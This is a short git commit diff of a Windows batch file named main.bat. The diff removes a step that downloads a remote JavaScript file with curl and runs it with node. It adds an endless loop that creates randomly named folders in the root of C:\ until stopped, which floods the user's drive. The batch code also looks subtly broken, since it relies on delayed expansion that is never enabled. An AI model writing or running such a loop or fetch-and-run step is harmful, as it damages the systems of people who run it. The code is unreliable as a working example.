f398fd4d658cb85f6671f4cdeaedda1b83a31b83
taha00125 <166647818+taha00125@users.noreply.github.com>
2024-04-10 21:37:51 +0330

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,8 +1,21 @@
 @echo off
 setlocal
 
-curl -o script.js https://raw.githubusercontent.com/user/repository/script.js
-echo Running script...
-node script.js
-timeout /t 5 /nobreak >nul
-goto start
+set "chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+set "length=10"
+
+:loop
+set "folderName="
+for /l %%i in (1,1,%length%) do (
+    set /a index=!random! %% 62
+    for /l %%j in (!index!,1,!index!) do (
+        set "folderName=!folderName!!chars:~%%j,1!"
+    )
+)
+
+if exist "C:\!folderName!" (
+    goto loop
+) else (
+    md "C:\!folderName!"
+    goto loop
+)
